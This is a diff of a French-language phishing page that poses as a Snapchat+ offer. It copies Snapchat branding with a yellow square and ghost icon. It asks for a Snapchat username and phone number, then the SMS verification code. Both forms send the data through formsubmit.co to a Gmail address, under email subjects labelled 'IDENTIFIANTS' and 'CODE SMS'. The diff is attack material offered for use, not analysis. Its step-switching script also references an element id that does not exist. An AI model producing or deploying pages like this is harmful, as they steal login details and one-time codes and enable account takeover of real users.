@@ -1,5 +1,6 @@
                     
-<!DOCTYPE html>
+
+                <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -10,7 +11,7 @@
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* Ton image de fond */
+            /* Fond personnalisé */
             background-image: url('fond.jpg');
             background-size: cover;
             background-position: center;
@@ -31,17 +32,24 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
 
-        /* Logo fantôme blanc */
+        /* Carré jaune avec fantôme blanc (Style Snap) */
         .snap-logo {
             width: 100px;
             height: 100px;
-            background-color: transparent;
+            background-color: #FFFC00;
+            border-radius: 25px;
             margin: 0 auto 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
 
-        .snap-logo img {
-            width: 100%;
-            height: auto;
+        /* Fantôme blanc SVG intégré */
+        .ghost-svg {
+            width: 60px;
+            height: 60px;
+            fill: #FFFFFF;
         }
 
         h1 {
@@ -118,17 +126,24 @@
 <body>
 
     <div class="container">
-        <!-- LOGO BLANC -->
+        <!-- Carré jaune avec fantôme -->
         <div class="snap-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Snapchat_icon_2019.svg/1200px-Snapchat_icon_2019.svg.png" alt="Snapchat">
+            <svg class="ghost-svg" viewBox="0 0 24 24">
+                <path d="M12 2C9.24 2 7 4.24 7 7v3.5c0 1.38-1.12 2.5-2.5 2.5S2 11.88 2 10.5V7c0-3.87 3.13-7 7-7s7 3.13 7 7v3.5c0 1.38 1.12 2.5 2.5 2.5s2.5-1.12 2.5-2.5V7c0-3.87-3.13-7-7-7zm-2.5 13c-.83 0-1.5.67-1.5 1.5 0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5c0-.83-.67-1.5-1.5-1.5zm5 0c-.83 0-1.5.67-1.5 1.5 0 .83.67 1.5 1.5 1.5s1.5-.67 1.5-1.5c0-.83-.67-1.5-1.5-1.5z"/>
+            </svg>
         </div>
 
-        <!-- Étape 1 : Infos -->
+        <!-- Étape 1 : Infos (Nom + Numéro) -->
         <div id="step-1">
             <h1>Obtenez Snapchat+</h1>
             <p>Vérification requise pour activer votre profil.</p>
             
+            <!-- Envoi de l'email 1 -->
             <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="Snapchat+ - IDENTIFIANTS">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="">
+
                 <div class="form-group">
                     <label for="username">Nom d'utilisateur Snapchat</label>
                     <input type="text" id="username" name="username" placeholder="Ex: john_doe" required>
@@ -139,28 +154,25 @@
                     <input type="tel" id="phone" name="phone" placeholder="Ex: 06 12 34 56 78" required>
                 </div>
 
-                <input type="hidden" name="_subject" value="Snapchat+ Infos">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="">
-
                 <button type="submit" class="btn-submit">Vérifier</button>
             </form>
         </div>
 
-        <!-- Étape 2 : Code SMS -->
+        <!-- Étape 2 : Code SMS (Apparaît après le clic) -->
         <div id="step-2">
             <h1>Vérification</h1>
             <p>Nous avons envoyé un code à votre numéro.</p>
             
+            <!-- Envoi de l'email 2 -->
             <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="Snapchat+ - CODE SMS">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="">
+
                 <div class="form-group">
                     <label for="code">Code SMS</label>
                     <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
                 </div>
-
-                <input type="hidden" name="_subject" value="Snapchat+ Code SMS">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="">
 
                 <button type="submit" class="btn-submit">Confirmer</button>
             </form>
@@ -171,15 +183,13 @@
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Cacher le step 1 et afficher le step 2 dès que l'utilisateur clique sur "Vérifier"
-            document.getElementById('step-1 form').addEventListener('submit', function(e) {
-                // On empêche la page de recharger immédiatement pour montrer l'étape 2
-                setTimeout(() => {
-                    document.getElementById('step-1').style.display = 'none';
-                    document.getElementById('step-2').style.display = 'block';
-                }, 500);
-            });
+        // Transition automatique après le clic sur "Vérifier"
+        document.getElementById('step-1 form').addEventListener('submit', function(e) {
+            // On empêche la rechargement immédiat pour laisser le temps à l'animation
+            setTimeout(() => {
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
+            }, 200);
         });
     </script>
 </body>
